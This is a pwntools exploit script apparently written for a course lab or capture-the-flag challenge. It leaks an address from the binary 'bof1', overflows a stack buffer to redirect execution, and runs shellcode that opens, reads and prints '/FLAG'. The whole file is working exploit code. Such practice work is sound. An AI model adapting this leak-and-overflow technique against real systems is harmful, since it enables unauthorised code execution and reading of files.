#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from pwn import *
import sys

context.arch = 'amd64'
context.os = 'linux'
context.terminal = ['gnome-terminal', '--']

exe = './bof1'
port = 10258

elf = ELF(exe)
off_main = elf.symbols[b'main']
base = 0
qemu_base = 0

r = None
if 'local' in sys.argv[1:]:
    r = process(exe, shell=False)
elif 'qemu' in sys.argv[1:]:
    qemu_base = 0x4000000000
    r = process(f'qemu-x86_64-static {exe}', shell=True)
else:
    r = remote('up.zoolab.org', port)

asm_code = """
mov rax, 0x00000047414c462f
push rax

mov rax, 0x02
mov rdi, rsp
mov rsi, 0
syscall

mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx
mov rbx, 0x0000000000000000
push rbx

mov rdi, rax
mov rax, 0x0
mov rsi, rsp
mov rdx, 40
syscall

mov rax, 0x1
mov rdi, 0x1
syscall

mov rax, 0x3c
mov rdi, 0x0
syscall
"""

sc = asm(asm_code)

r.sendafter(b'name? ', b'NO')
r.sendafter(b'number? ', b'A' * 40)
r.recvuntil(b'A' * 40)
dynamic_address = r.recvuntil(b'\n')[:-1]
address = int.to_bytes(int.from_bytes(dynamic_address, 'little') + 829180, 8, 'little')

r.sendafter(b'name? ', b'A' * 40 + address)

r.sendafter(b'message: ', sc)

r.recvuntil(b'you!\n')

print(r.recvuntil(b'\n')[:-1])
